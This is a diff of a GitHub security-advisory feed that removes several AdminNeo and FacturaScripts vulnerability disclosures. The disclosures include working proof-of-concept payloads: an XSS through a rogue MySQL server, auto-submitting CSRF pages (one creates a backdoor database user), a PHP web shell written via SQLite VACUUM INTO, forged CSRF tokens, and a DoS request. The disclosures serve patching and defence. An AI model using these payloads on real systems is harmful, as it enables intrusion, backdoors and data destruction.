-# Terminal 2: start rogue MySQL
-python3 rogue_mysql.py
-</code></pre>
-<h3 id="2-trigger-the-xss">2. Trigger the XSS</h3>
-<p>Open a browser and navigate to <code>http://localhost:8081/adminneo.php</code>:</p>
-<ol>
-<li>Select driver: <strong>MySQL</strong></li>
-<li>Server: <code>HOST_IP:3307</code> (IP of the machine running rogue_mysql.py)</li>
-<li>Username: <code>root</code></li>
-<li>Password: <code>x</code></li>
-<li>Click Login.</li>
-</ol>
-<p>The rogue server accepts the login. AdminNeo renders the dashboard and includes:</p>
-<pre><code class="language-html">&lt;script nonce="REAL_NONCE"&gt;let autocompletion;
-window.addEventListener('DOMContentLoaded', () =&gt; { initSyntaxHighlighting('1');alert(origin)//', 'mysql', autocompletion); });&lt;/script&gt;
-</code></pre>
-<p>The browser executes <code>alert(origin)</code> with full CSP bypass because the script tag carries a valid nonce.</p>
-<h3 id="3-trigger-it-via-login-csrf">3. Trigger it via Login CSRF</h3>
-<p>The login form has no CSRF token. An attacker page auto-submits the login, forcing the victim's browser to connect to the rogue server:</p>
-<pre><code class="language-html">&lt;form id="f" method="POST" action="http://TARGET/adminneo.php"&gt;
-  &lt;input name="auth[driver]" value="mysql"&gt;
-  &lt;input name="auth[server]" value="ROGUE_IP:3307"&gt;
-  &lt;input name="auth[username]" value="root"&gt;
-  &lt;input name="auth[password]" value="x"&gt;
-&lt;/form&gt;
-&lt;script&gt;document.getElementById('f').submit()&lt;/script&gt;
-</code></pre>
-<h2 id="collaborator-request">Collaborator Request</h2>
-<p>This vulnerability was discovered jointly with Yashar Shahinzadeh (GitHub: @Voorivex). Could you please add him as a collaborator on this advisory and credit him as a co-discoverer? Thank you!</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/adminneo-org/adminneo/security/advisories/GHSA-rx7m-wxwq-vxr9">https://github.com/adminneo-org/adminneo/security/advisories/GHSA-rx7m-wxwq-vxr9</a></li>
-<li><a href="https://github.com/vrana/adminer/security/advisories/GHSA-h6jr-7pr6-grgj">https://github.com/vrana/adminer/security/advisories/GHSA-h6jr-7pr6-grgj</a></li>
-<li><a href="https://github.com/adminneo-org/adminneo/commit/2c86406808bc2517efb35f5595b3a05761c2eacd">https://github.com/adminneo-org/adminneo/commit/2c86406808bc2517efb35f5595b3a05761c2eacd</a></li>
-<li><a href="https://github.com/adminneo-org/adminneo/releases/tag/v5.5.1">https://github.com/adminneo-org/adminneo/releases/tag/v5.5.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-rx7m-wxwq-vxr9">https://github.com/advisories/GHSA-rx7m-wxwq-vxr9</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rx7m-wxwq-vxr9</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-10-30T22:52:23.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[adminneo-org/adminneo] AdminNeo: RCE via SQLite VACUUM INTO (ATTACH Blocklist Bypass)]]></title>
-        <id>https://github.com/advisories/GHSA-q5mp-gfjf-cf2j</id>
-        <link href="https://github.com/advisories/GHSA-q5mp-gfjf-cf2j"/>
-        <updated>2026-10-30T22:51:38.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>Adminer blocks <code>ATTACH</code> queries for SQLite to prevent arbitrary file creation. However, <code>VACUUM INTO</code> is not blocked and achieves the same result: writing a database file containing attacker-controlled PHP code to any path with any extension. An authenticated SQLite user can write a web shell to the web root and execute commands.</p>
-<p>Originally reported in Adminer: <a href="https://github.com/vrana/adminer/security/advisories/GHSA-gmx3-g29w-77wf">GHSA-q4f2-39gr-45jh</a></p>
-<h2 id="root-cause">Root Cause</h2>
-<p>sql.inc.php, line 146:</p>
-<pre><code class="language-php">if (DIALECT == "sqlite" &amp;&amp; preg_match("~^$space*+ATTACH\\b~i", $q, $match)) {
-    // blocked
-}
-</code></pre>
-<p>Only <code>ATTACH</code> is in the blocklist. <code>VACUUM INTO</code> (available since SQLite 3.27.0) writes the entire database to a new file at an arbitrary path with an arbitrary extension. It is not checked.</p>
-<h2 id="steps-to-reproduce">Steps To Reproduce</h2>
-<h3 id="1--login-to-sqlite">1.  Login to SQLite</h3>
-<ol>
-<li>Open AdminNeo and select driver: <strong>SQLite</strong></li>
-<li>Login and create a new database (e.g., <code>stage.db</code>)</li>
-</ol>
-<h3 id="2-inject-php-code-and-write-the-shell">2. Inject PHP code and write the shell</h3>
-<p>Navigate to <strong>SQL command</strong> and execute:</p>
-<pre><code class="language-sql">CREATE TABLE "&lt;?php system($_GET['c']); ?&gt;" (i int);
-VACUUM INTO '/var/www/html/shell.php';
-</code></pre>
-<p>The SQLite file is written to <code>/var/www/html/shell.php</code>. The table name containing <code>&lt;?php</code> appears as raw bytes in the file. PHP's parser finds and executes it.</p>
-<h3 id="3-execute-commands">3. Execute commands</h3>
-<pre><code class="language-shell">curl "http://TARGET/shell.php?c=id"
-# uid=0(root) gid=0(root) groups=0(root)
-</code></pre>
-<h2 id="collaborator-request">Collaborator Request</h2>
-<p>This vulnerability was discovered jointly with Yashar Shahinzadeh (GitHub: @voorivex). Could you please add him as a collaborator on this advisory and credit him as a co-discoverer? Thank you!</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/adminneo-org/adminneo/security/advisories/GHSA-q5mp-gfjf-cf2j">https://github.com/adminneo-org/adminneo/security/advisories/GHSA-q5mp-gfjf-cf2j</a></li>
-<li><a href="https://github.com/adminneo-org/adminneo/commit/cf45efb3ac34e5e7b699cdc996f6eec2814ccda1">https://github.com/adminneo-org/adminneo/commit/cf45efb3ac34e5e7b699cdc996f6eec2814ccda1</a></li>
-<li><a href="https://github.com/adminneo-org/adminneo/releases/tag/v5.5.1">https://github.com/adminneo-org/adminneo/releases/tag/v5.5.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-q5mp-gfjf-cf2j">https://github.com/advisories/GHSA-q5mp-gfjf-cf2j</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-q5mp-gfjf-cf2j</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-10-30T22:51:37.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[adminneo-org/adminneo] AdminNeo: CSRF Token Secret Recoverable from Single Observed Token, Enabling Cross-Site Request Forgery]]></title>
-        <id>https://github.com/advisories/GHSA-wm25-49w3-5qrg</id>
-        <link href="https://github.com/advisories/GHSA-wm25-49w3-5qrg"/>
-        <updated>2026-10-30T22:51:31.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>AdminNeo's CSRF protection uses a BREACH-resistant XOR masking scheme, but the implementation transmits both the XOR mask and the masked value in every token. This allows any observer who sees a single CSRF token (via network sniffing, log files, Referrer header, or XSS) to instantly recover the session secret and forge unlimited valid CSRF tokens. Additionally, the underlying session token has only ~20 bits of entropy (<code>rand(1, 1e6)</code>), making blind brute-force feasible even without token observation.</p>
-<p>Originally reported by @az0mb13 in Adminer: <a href="https://github.com/vrana/adminer/security/advisories/GHSA-33j4-hc95-pggg">GHSA-q4f2-39gr-45jh</a></p>
-<h3 id="details">Details</h3>
-<p>Token generation in <code>admin/include/functions.inc.php</code> lines 1181-1184:</p>
-<pre><code class="language-php">function get_token() {
-    $rand = rand(1, 1e6);
-    return ($rand ^ $_SESSION["token"]) . ":$rand";
-}
-</code></pre>
-<p>Token verification in lines 1189-1192:</p>
-<pre><code class="language-php">function verify_token() {
-    list($token, $rand) = explode(":", $_POST["token"]);
-    return ($rand ^ $_SESSION["token"]) == $token;
-}
-</code></pre>
-<p>Session token initialized in <code>admin/include/auth.inc.php</code> lines 327 and 385:</p>
-<pre><code class="language-php">$_SESSION["token"] = rand(1, 1e6);
-</code></pre>
-<p><strong>Three distinct weaknesses:</strong></p>
-<ol>
-<li><strong>Instant recovery:</strong> The token format <code>(rand XOR secret):rand</code> transmits both operands. Recovery is trivial: <code>secret = masked_value XOR rand</code>.</li>
-<li><strong>Low entropy</strong>: Only 1,000,000 possible session tokens (~20 bits). Blind brute-force requires at most 1M requests.</li>
-<li><strong>Loose comparison</strong>: <code>verify_token()</code> uses <code>==</code> (loose comparison) instead of <code>===</code>, enabling PHP type juggling.</li>
-</ol>
-<h3 id="poc">PoC</h3>
-<p><strong>Validated against a live AdminNeo 5.5.0 instance (MySQL 8.0, PHP 8.2).</strong></p>
-<p><strong>Step 1: Observe a single CSRF token</strong></p>
-<p>Load any authenticated AdminNeo page and extract a token from the HTML source. Tokens appear in hidden form fields:</p>
-<pre><code class="language-html">&lt;input type='hidden' name='token' value='222277:990527'&gt;
-</code></pre>
-<p>Token observation vectors: Referrer header leak, shared proxy logs, browser history, limited XSS, network sniffing.</p>
-<p><strong>Step 2: Recover the session secret (instant, 1 XOR operation)</strong></p>
-<pre><code class="language-python">observed = "542273:441804"
-masked, rand_val = observed.split(":")
-session_secret = int(masked) ^ int(rand_val)
-# Result: 817530
-</code></pre>
-<p>The token format is <code>(rand XOR secret):rand</code>. Both operands are transmitted, so the secret is recovered with a single XOR — zero additional requests needed.</p>
-<p><strong>Step 3: Forge unlimited valid CSRF tokens</strong></p>
-<pre><code class="language-python">import random
-forge_rand = random.randint(1, 1000000)
-forged = f"{forge_rand ^ session_secret}:{forge_rand}"
-# Example output: 729376:481370
-</code></pre>
-<p>Each forged token is unique and valid. The attacker can generate as many as needed.</p>
-<p><strong>Step 4: Execute arbitrary SQL with the forged token</strong></p>
-<pre><code class="language-shell"># Forged token used to DROP a table the attacker never had a token for:
-curl -b victim_cookies.txt \
-  'http://target/adminneo/?mysql=127.0.0.1&amp;username=root&amp;db=testdb&amp;sql=' \
-  --data-urlencode "token=729376:481370" \
-  --data-urlencode "query=DROP TABLE csrf_victim_table;" \
-  -d "limit=0"
-</code></pre>
-<p><strong>Step 5: Verify a random wrong token is rejected (control)</strong></p>
-<pre><code class="language-shell">curl -b victim_cookies.txt \
-  'http://target/adminneo/?mysql=127.0.0.1&amp;username=root&amp;db=testdb&amp;sql=' \
-  --data-urlencode "token=111:222" \
-  --data-urlencode "query=SELECT 1" -d "limit=1"
-# Result: "Invalid CSRF token. Send the form again."
-</code></pre>
-<p><strong>Weaponized CSRF attack page</strong></p>
-<p>In a real attack, the attacker hosts this HTML page and lures the victim to visit it while authenticated to AdminNeo:</p>
-<pre><code class="language-html">&lt;html&gt;&lt;body&gt;
-&lt;h1&gt;Click here for free database optimization tips&lt;/h1&gt;
-&lt;!-- Attacker recovered secret 817530 from an observed token --&gt;
-&lt;!-- Forged token: 729376:481370 --&gt;
-&lt;iframe style="display:none" name="x"&gt;&lt;/iframe&gt;
-&lt;form id="f" method="POST" target="x"
-      action="http://target/adminneo/?mysql=127.0.0.1&amp;username=root&amp;db=production&amp;sql="&gt;
-  &lt;input type="hidden" name="token" value="729376:481370"&gt;
-  &lt;input type="hidden" name="query" value="CREATE USER 'backdoor'@'%' IDENTIFIED BY 'p@ss'; GRANT ALL ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;"&gt;
-  &lt;input type="hidden" name="limit" value="0"&gt;
-&lt;/form&gt;
-&lt;script&gt;document.getElementById('f').submit();&lt;/script&gt;
-&lt;/body&gt;&lt;/html&gt;
-</code></pre>
-<h3 id="impact">Impact</h3>
-<ul>
-<li><strong>Cross-Site Request Forgery</strong> against authenticated AdminNeo users. Validated: forged token used to CREATE TABLE, INSERT data, SELECT data, and DROP TABLE — all accepted by the server.</li>
-<li>An attacker who observes a single CSRF token (via Referrer header, proxy logs, XSS, or network sniffing) can instantly recover the session secret and forge unlimited valid tokens.</li>
-<li>With a forged token, the attacker can execute arbitrary SQL through the victim's session: drop tables/databases, exfiltrate data, create backdoor users, or modify records.</li>
-<li>The low entropy (<del>20 bits, 1M possible values) also enables blind brute-force without observing any token, requiring at most 1M requests (</del>17 minutes at 1000 req/sec).</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/adminneo-org/adminneo/security/advisories/GHSA-wm25-49w3-5qrg">https://github.com/adminneo-org/adminneo/security/advisories/GHSA-wm25-49w3-5qrg</a></li>
-<li><a href="https://github.com/adminneo-org/adminneo/commit/f575eee5e35eacd6c55a9912648e9e8fe24a9f44">https://github.com/adminneo-org/adminneo/commit/f575eee5e35eacd6c55a9912648e9e8fe24a9f44</a></li>
-<li><a href="https://github.com/adminneo-org/adminneo/releases/tag/v5.5.1">https://github.com/adminneo-org/adminneo/releases/tag/v5.5.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-wm25-49w3-5qrg">https://github.com/advisories/GHSA-wm25-49w3-5qrg</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-wm25-49w3-5qrg</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-10-30T22:51:29.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[adminneo-org/adminneo] AdminNeo: version-cache array injection causes persistent denial of service]]></title>
-        <id>https://github.com/advisories/GHSA-jm85-8cpp-9cjc</id>
-        <link href="https://github.com/advisories/GHSA-jm85-8cpp-9cjc"/>
-        <updated>2026-10-30T18:53:08.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>AdminNeo v5.4.1 gets the latest version from GitHub API in a browser JavaScript function. Version number is then sent by POST request to <code>?script=version</code>. This endpoint lacks origin validation and accepts POST data from any source. An attacker can POST <code>version[]</code> parameter which PHP converts to an array. On next page load, function <code>rawurlencode()</code> receives this array instead of string and throws <code>TypeError</code>, returning HTTP 500 to all users for the next 24 hours.</p>
-<p>Originally reported by @JoyGhoshs in Adminer: <a href="https://github.com/vrana/adminer/security/advisories/GHSA-q4f2-39gr-45jh">https://github.com/vrana/adminer/security/advisories/GHSA-q4f2-39gr-45jh</a>
-Although the version checking process was modified in AdminNeo, the root cause persisted.</p>
-<h3 id="workaround">Workaround</h3>
-<p>If you can't upgrade, make the file <code>adminneo.version</code> in temp directory (usually the value of <a href="https://www.php.net/ini.core#ini.upload-tmp-dir">upload_tmp_dir</a>) unwritable by web server.</p>
-<h3 id="details">Details</h3>
-<h4 id="1-intended-design-of-scriptversion">1. Intended design of <code>?script=version</code></h4>
-<p>The endpoint is designed to receive version data from GitHub via browser JavaScript.</p>
-<ul>
-<li><code>functions.js</code> line 110-121: Receives the latest release information from GitHub API by AJAX.</li>
-<li>JavaScript POSTs version number to <code>?script=version</code>.</li>
-<li>Server stores version number in <code>/tmp/adminneo.version</code> file that is used as a shared cache for all users in the same server for the next 24 hours.</li>
-</ul>
-<pre><code class="language-js">// function.js lines 119-120
-const data = 'version=' + version + '&amp;token=' + token;
-ajax(baseUrl + 'script=version', null, data);
-</code></pre>
-<h4 id="2-the-vulnerability">2. The vulnerability</h4>
-<p>The endpoint only checks <code>$_GET["script"] == "version"</code> - it does not validate:</p>
-<ul>
-<li>Request origin (CSRF token is present, but not checked for this endpoint)</li>
-<li>Request source (any HTTP client can POST)</li>
-<li>Parameter types (<code>version</code> expected as string, array not rejected)</li>
-</ul>
-<pre><code class="language-php">// bootstrap.inc.php lines 44-53
-if ($_GET["script"] == "version") {
-    $filename = get_temp_dir() . "/adminneo.version";
-    @unlink($filename); // It may not be writable by us, @ - it may not exist.
-
-    $file = open_file_with_lock($filename);
-    if ($file) {
-        write_and_unlock_file($file, serialize(["version" =&gt; $_POST["version"]]));
-    }
-    exit;
-}
-</code></pre>
-<h4 id="3-type-confusion-crash">3. Type confusion crash</h4>
-<p>When POST contains <code>version[]</code> instead of <code>version</code>, PHP creates an array. When AdminNeo reads this file and passes to <code>cookie()</code> and then to <code>rawurlencode()</code>:</p>
-<pre><code class="language-php">// design.inc.php line 40
-cookie("neo_version", $data["version"], $lifetime); // Sync expiration with the file.
-
-// functions.inc.php lines 398-405
-function cookie(string $name, string $value, int $lifetime = 2592000): void
-{
-    header("Set-Cookie: $name=" . rawurlencode($value)
-        . ($lifetime ? "; expires=" . gmdate("D, d M Y H:i:s", time() + $lifetime) . " GMT" : "")
-        . "; path=" . preg_replace('~\?.*~', '', $_SERVER["REQUEST_URI"])
-        . (HTTPS ? "; secure" : "")
-        . "; HttpOnly; SameSite=lax",
-        false);
-}
-</code></pre>
-<p>PHP 8.x throws:</p>
-<pre><code>Fatal error: Uncaught TypeError: rawurlencode(): Argument #1 ($string) must be of type string, array given
-</code></pre>
-<h3 id="steps-to-reproduce">Steps to Reproduce</h3>
-<p>(Example URL is for the official AdminNeo Docker image.)</p>
-<p><strong>Step 1:</strong> Verify AdminNeo is running and accessible.</p>
-<pre><code class="language-sh">curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8080
-</code></pre>
-<p>Expected output:</p>
-<pre><code>200
-</code></pre>
-<p><strong>Step 2:</strong> Send the malicious POST request. The <code>version[]</code> syntax causes PHP to create an array instead of a string.</p>
-<pre><code class="language-sh">curl -X POST "http://localhost:8080?script=version" -d "version[]=INJECTED"
-</code></pre>
-<p>Expected output: Empty response (no error).</p>
-<p><strong>Step 3:</strong> Access Adminer again to trigger the crash.</p>
-<pre><code class="language-sh">curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8080
-</code></pre>
-<p>Expected output:</p>
-<pre><code>500
-</code></pre>
-<p><strong>Step 4:</strong> (Optional) View the PHP error in server logs.</p>
-<pre><code>Fatal error: Uncaught TypeError: rawurlencode(): Argument #1 ($string) must be of type string, array given
-</code></pre>
-<p><strong>Step 5:</strong> (Optional) Inspect the poisoned file.</p>
-<pre><code class="language-sh">cat /tmp/adminneo.version
-</code></pre>
-<p>Expected output:</p>
-<pre><code>a:1:{s:7:"version";a:1:{i:0;s:8:"INJECTED";}}
-</code></pre>
-<p><strong>Recovery:</strong></p>
-<pre><code class="language-sh">rm /tmp/adminer.version
-</code></pre>
-<p>After deletion, AdminNeo returns HTTP 200.</p>
-<hr>
-
-<h3 id="impact">Impact</h3>
-<p><strong>Type:</strong> Denial of Service</p>
-<p><strong>Root cause:</strong> The <code>?script=version</code> endpoint is designed to receive data from GitHub via JavaScript, but lacks server-side validation. Any HTTP client can POST directly to this endpoint. Combined with missing type validation before <code>rawurlencode()</code>, this allows DoS for the next 24 hours.</p>
-<p><strong>Affected users:</strong> Any AdminNeo instance accessible over the network.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/adminneo-org/adminneo/security/advisories/GHSA-jm85-8cpp-9cjc">https://github.com/adminneo-org/adminneo/security/advisories/GHSA-jm85-8cpp-9cjc</a></li>
-<li><a href="https://github.com/adminneo-org/adminneo/commit/b7ae929e6afb374f0a7aba3d73b7d441470ff907">https://github.com/adminneo-org/adminneo/commit/b7ae929e6afb374f0a7aba3d73b7d441470ff907</a></li>
-<li><a href="https://github.com/adminneo-org/adminneo/releases/tag/v5.5.0">https://github.com/adminneo-org/adminneo/releases/tag/v5.5.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-jm85-8cpp-9cjc">https://github.com/advisories/GHSA-jm85-8cpp-9cjc</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jm85-8cpp-9cjc</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-10-30T18:53:08.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[facturascripts/facturascripts] FacturaScripts vulnerable to Reflected Cross-Site Scripting (XSS) via Cookie Manipulation]]></title>
-        <id>https://github.com/advisories/GHSA-gq5c-rw37-g46c</id>
-        <link href="https://github.com/advisories/GHSA-gq5c-rw37-g46c"/>
-        <updated>2026-10-30T16:55:33.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A Reflected Cross-Site Scripting (XSS) vulnerability exists in the fsNick cookie parameter. The application reflects the cookie's value directly into the HTML without sanitization.</p>
-<h3 id="details">Details</h3>
-<p>The fsNick cookie is rendered into the DOM without encoding. While the server does reject the modified session and forces a logout, the HTML containing the payload reaches the browser first. This lets the script execute immediately upon load, effectively beating the redirect.</p>
-<h3 id="poc">PoC</h3>
-<ol>
-<li><p>Log in to the application with any valid account.</p>
-<img width="2078" height="302" alt="image" src="https://github.com/user-attachments/assets/d8a9a779-44e0-4a3e-839f-0a031868fbd5">
-</li>
-<li><p>Capture any the GET request .</p>
-<img width="1267" height="276" alt="image" src="https://github.com/user-attachments/assets/22e43f73-4f86-4cab-a074-7aba584a71ac">
-</li>
-<li><p>Modify  the value of "fsNick" with the following JavaScript:
-<code>&lt;script&gt;alert(window.origin)&lt;/script&gt;</code></p>
-</li>
-<li><p>Send the modified request.</p>
-<img width="1569" height="319" alt="image" src="https://github.com/user-attachments/assets/ade88db1-aadc-4c50-9e02-d09888067e98">
-</li>
-<li><p>Result</p>
-<img width="1217" height="771" alt="image" src="https://github.com/user-attachments/assets/5858fe9f-127a-4845-b484-5a7ef4ae2cb4"></li>
-</ol>
-<h3 id="impact">Impact</h3>
-<p>The payload executes before the session ends, which could potentially allow for a single unauthorized action before the logout.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/NeoRazorX/facturascripts/security/advisories/GHSA-gq5c-rw37-g46c">https://github.com/NeoRazorX/facturascripts/security/advisories/GHSA-gq5c-rw37-g46c</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27964">https://nvd.nist.gov/vuln/detail/CVE-2026-27964</a></li>
-<li><a href="https://github.com/NeoRazorX/facturascripts/commit/9066e10326029adf012114e27eb5f3f33f78ecfd">https://github.com/NeoRazorX/facturascripts/commit/9066e10326029adf012114e27eb5f3f33f78ecfd</a></li>
-<li><a href="https://github.com/advisories/GHSA-gq5c-rw37-g46c">https://github.com/advisories/GHSA-gq5c-rw37-g46c</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-gq5c-rw37-g46c</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-05-07T19:34:28.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[facturascripts/facturascripts] FacturaScripts vulnerable to Reflected Cross-Site Scripting (XSS) via Cookie Manipulation]]></title>
-        <id>https://github.com/advisories/GHSA-gq5c-rw37-g46c</id>
-        <link href="https://github.com/advisories/GHSA-gq5c-rw37-g46c"/>
-        <updated>2026-10-30T16:55:33.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A Reflected Cross-Site Scripting (XSS) vulnerability exists in the fsNick cookie parameter. The application reflects the cookie's value directly into the HTML without sanitization.</p>
-<h3 id="details">Details</h3>
-<p>The fsNick cookie is rendered into the DOM without encoding. While the server does reject the modified session and forces a logout, the HTML containing the payload reaches the browser first. This lets the script execute immediately upon load, effectively beating the redirect.</p>
-<h3 id="poc">PoC</h3>
-<ol>
-<li><p>Log in to the application with any valid account.</p>
-<img width="2078" height="302" alt="image" src="https://github.com/user-attachments/assets/d8a9a779-44e0-4a3e-839f-0a031868fbd5">
-</li>
-<li><p>Capture any the GET request .</p>
-<img width="1267" height="276" alt="image" src="https://github.com/user-attachments/assets/22e43f73-4f86-4cab-a074-7aba584a71ac">
-</li>
-<li><p>Modify  the value of "fsNick" with the following JavaScript:
-<code>&lt;script&gt;alert(window.origin)&lt;/script&gt;</code></p>
-</li>
-<li><p>Send the modified request.</p>
-<img width="1569" height="319" alt="image" src="https://github.com/user-attachments/assets/ade88db1-aadc-4c50-9e02-d09888067e98">
-</li>
-<li><p>Result</p>
-<img width="1217" height="771" alt="image" src="https://github.com/user-attachments/assets/5858fe9f-127a-4845-b484-5a7ef4ae2cb4"></li>
-</ol>
-<h3 id="impact">Impact</h3>
-<p>The payload executes before the session ends, which could potentially allow for a single unauthorized action before the logout.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/NeoRazorX/facturascripts/security/advisories/GHSA-gq5c-rw37-g46c">https://github.com/NeoRazorX/facturascripts/security/advisories/GHSA-gq5c-rw37-g46c</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27964">https://nvd.nist.gov/vuln/detail/CVE-2026-27964</a></li>
-<li><a href="https://github.com/NeoRazorX/facturascripts/commit/9066e10326029adf012114e27eb5f3f33f78ecfd">https://github.com/NeoRazorX/facturascripts/commit/9066e10326029adf012114e27eb5f3f33f78ecfd</a></li>
-<li><a href="https://github.com/advisories/GHSA-gq5c-rw37-g46c">https://github.com/advisories/GHSA-gq5c-rw37-g46c</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-gq5c-rw37-g46c</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-05-07T19:34:28.000Z</published>
     </entry>
 </feed>
